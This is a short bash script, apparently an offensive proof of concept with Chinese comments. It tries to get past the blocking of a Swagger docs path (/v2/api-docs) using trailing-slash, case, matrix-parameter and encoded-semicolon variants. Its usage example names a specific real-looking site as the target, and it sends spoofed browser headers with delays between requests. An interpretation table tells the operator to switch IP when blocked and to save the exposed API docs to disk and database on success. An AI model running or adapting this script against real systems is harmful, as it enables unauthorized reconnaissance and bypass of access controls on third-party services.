#!/usr/bin/env bash
# api-docs 精确路径屏蔽判别法 —— 只用 5 个请求分清「谁在挡」
# 用法: ./apidocs-deny-matrix.sh <HOST> <DOCS_PATH> [GAP_SEC]
#   ./apidocs-deny-matrix.sh canary.jobmd.cn /v2/api-docs 100
set -u
# ---- 参数检查 ----
if [ $# -lt 2 ]; then printf '用法: ./poc.sh <HOST> <DOCS_PATH> [GAP_SEC]\n' >&2; exit 1; fi
H="$1"; P="$2"; GAP="${3:-100}"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

probe () { # $1=path  $2=label
  local out hd
  hd=$(mktemp); out=$(mktemp)
  code=$(curl -sk -m 25 --http1.1 -D "$hd" -o "$out" \
      -H "User-Agent: $UA" -H 'Accept: application/json, text/plain, */*' \
      --path-as-is -w '%{http_code}|%{size_download}' "https://$H$1")
  echo "== $2  https://$H$1 → $code"
  grep -iE '^(content-type|x-frame-options|cache-control|vary|location|server)' "$hd" | sed 's/^/   /'
  echo "   body: $(head -c 200 "$out")"
  rm -f "$hd" "$out"; sleep "$GAP"
}

echo "### 0. 应用层 404 基线（必须拿到应用自定义 envelope，否则整张表作废）"
probe "/zz-$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')" "random"
echo "### 1. 目标路径"
probe "$P" "exact"
echo "### 2. 尾斜杠：能到 Dispatcher 说明屏蔽层可穿、只差 handler 匹配"
probe "$P/" "trailing-slash"
echo "### 3. 大小写"
UP=$(echo "$P" | sed 's#/\([a-z]\)#/\U\1#')
probe "$UP" "case"
echo "### 4. matrix 参数（关键：唯一能让两侧看到不同路径的手法）"
probe "$P;a=b" "matrix"
echo "### 5. 编码分号（防火墙若查原始 URI 也会拦）"
probe "$P%3Ba=1" "matrix-encoded"

cat <<'NOTE'
### 判读表
| 观测 | 结论 |
|---|---|
| exact = 404 且 Content-Length:0 且带 X-Frame-Options:DENY / Cache-Control:no-store / Vary:Origin | 应用侧精确路径屏蔽（Spring Security 默认头），不是 nginx |
| exact = 404 且是 nginx HTML 页 | 边缘 `location = ... { return 404; }`，只能换 IP |
| trailing-slash 返回应用自定义 404 envelope | 屏蔽层可穿，PathPattern 精确匹配挡住 handler → 只剩 matrix 手法 |
| matrix 返回 500 "potentially malicious String \";\"" | StrictHttpFirewall 严格模式 → 路径归一化全封（含 %3B / %2f / %2e / 双斜杠），收口，别再试 |
| matrix 返回 200 | 命中 swagger，立刻落盘 + 落库 |
| 把 UA / Referer / Accept 换掉后响应头逐字节不变（仅 Date 不同） | 静态路径规则，不是频率型 WAF → 不需要冷却重试 |
NOTE
